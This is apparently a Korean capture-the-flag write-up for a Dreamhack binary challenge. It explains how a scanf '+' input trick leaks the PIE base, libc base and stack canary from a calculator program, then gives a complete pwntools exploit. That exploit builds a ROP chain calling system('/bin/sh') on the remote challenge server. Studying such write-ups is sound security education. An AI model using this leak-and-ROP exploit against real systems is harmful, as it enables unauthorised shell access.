`scanf`에 `+`나 `-`를 입력하면 아무것도 입력하지 않을 수 있다는 트릭이 있다. 값을 가져오는 곳에 코드 영역 주소가 있기 때문에 `+`를 입력하고 스택의 값을 더하면 `코드 영역 값 + alpha`의 값을 알 수 있고, 그냥 -1을 입력하면 `alpha`의 값을 알 수 있기 때문에 이 둘을 빼주고 `offset`을 빼주면 `pie_base`를 구할 수 있다.

```
0x7fffffffc850: 0x0000000000000000      0x0000000000000000
0x7fffffffc860: 0x0000000000000000      0x0000000000000000
0x7fffffffc870: 0x0000000000000000      0x0000000000000000
0x7fffffffc880: 0x0000000000000000      0x0000000000000000
0x7fffffffc890: 0x00007fffffffc9d8      0xd73910ae66126e00
0x7fffffffc8a0: 0x00007fffffffc8b0      0x000055555555558e
0x7fffffffc8b0: 0x00007fffffffc950      0x00007ffff7dc91ca
0x7fffffffc8c0: 0x00007fffffffc900      0x00007fffffffc9d8
```

`0x7fffffffc850`에 `unsigned long long int k[16];`이 선언되어 있다고 가정하자. `k[0] ~ k[7]`은 0으로 초기화되고, `k[8], k[10], k[12], k[14], k[15]`은 스택 관련 주소, `k[9]`는 카나리, `k[11]`은 코드 영역 주소, `k[13]`은 `libc` 관련 주소이다.
`base`를 `(1 << 56)`으로 설정하고 결과 값의 하위 6바이트만 보면 `k[15]`가 도출될 것이므로 스택 관련 주소의 모든 값을 알 수 있다. 이제 우리는 `k[9], k[13]`을 모르고 나머지 값은 다 안다.
다음으로 `k[13]`을 알아낼 것이다. 그렇게 생각한 이유는 `libc` 관련 주소는 상위 2바이트가 `\x00\x00`이기 때문이다. `base`를 `(1 << 63) + (1 << 8)`로 설정하고 최상위 바이트를 무시한다고 가정하면 `val`은 `((k[0] << 120) + ... + (k[8] << 56) + (k[9] << 48) + ... + (k[14] << 8) + k[15]) & ((1 << 64) - 1)`가 될 것이며, 이는 2바이트씩 밀려서 더해지는 형태가 될 것이다.
![[KakaoTalk_20250228_173012514.jpg]]

위 그림처럼 생각하면 `k[13]`의 하위 5바이트를 알 수 있다. `libc`는 `\x7e` 또는 `\x7f`로 시작하므로 합리적인 고정(`\x7f`)를 통해 `k[13]`을 알아낼 수 있다.
`base`를 `(1 << 64) - 1`로 하면 `-1`을 곱하는 것과 같은 효과를 준다. `k[9]`만 모르고 나머지 값은 다 알기 때문에 `k[9]`도 알 수 있다. 이로써 익스에 필요한 모든 값을 알아냈다. `ROP`로 해결한다.

# Exploit

```python
from pwn import *
from tqdm import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('host1.dreamhack.games', 20130)
#p = process('./prob2')
l = ELF('./libc.so.6')

breaknum = (1 << 64) + 1

def calc(base : int, inputs : list):
    p.sendlineafter(b'Base: ', str(base).encode())
    for i in inputs:
        if type(i) == int : 
            if i > (1 << 64) : break
            else : i = str(i).encode()
        p.sendline(i)
    p.recvuntil(b'Value: ')
    return p.recvline()[:-1]

sum1 = int(calc((1 << 56) + 1, [b'+', -1, breaknum]))
sum2 = int(calc((1 << 56) + 1, [-1, breaknum]))
sum1 += 1 << 64
pie_base = sum1 - sum2 - 0x4020
pie_base &= 0xffffffffffff
print(hex(sum1))
print(hex(sum2))
print(hex(pie_base))
print()

st1 = int(calc((1 << 56), [-1, breaknum]))
st1 = (st1 & ((1 << 48) - 1))
st2 = st1 - (0x7fffffffc778 - 0x7fffffffc6a0)
st3 = st1 - (0x7fffffffc778 - 0x7fffffffc6f0)
st4 = st1 - (0x7fffffffc778 - 0x7fffffffc650)
st5 = st1
print(hex(st1))
print(hex(st2))
print(hex(st3))
print(hex(st4))
print(hex(st5))
print()

b = int(calc((1 << 63) + (1 << 8), [-1, breaknum]))
b -= st1
b >>= 8
b -= st2
b >>= 8
l.address = b & 0xff
b >>= 8
b -= st3 & 0xffffffff
l.address += (b & 0xff) << 8
b >>= 8
b -= (pie_base + 0x158e) & 0xffffff
l.address += (b & 0xff) << 16
b >>= 8
b -= st4 & 0xffff
l.address += (b & 0xffff) << 24
l.address += 0x7f0000000000
l.address = l.address - (0x7ffff7dd51ca - 0x7ffff7dab000)
print(hex(l.address))

c = int(calc((1 << 64) - 1, [-1, breaknum]))
nocanaryc = st1 + pie_base + 0x158e + l.address + (0x7ffff7dd51ca - 0x7ffff7dab000)
nocanaryc += (1 << 64) * 4
nocanaryc -= st2 + st3 + st4 + st5
nocanaryc &= (1 << 64) - 1
c += 1 << 64
canary = c - nocanaryc
canary &= (1 << 64) - 1
print(hex(canary))

system = l.sym['system']
binsh = list(l.search(b'/bin/sh'))[0]
pop_rdi = l.address + 0x000000000010f75b
ret = l.address + 0x000000000002e81b

#gdb.attach(p, "b* calc+217\nc")
int(calc((1 << 64) - 1, [0, 0, 0, 0, 0, 0, 0, 0, 0, canary, 0, ret, pop_rdi, binsh, system, 0]))
p.interactive()
```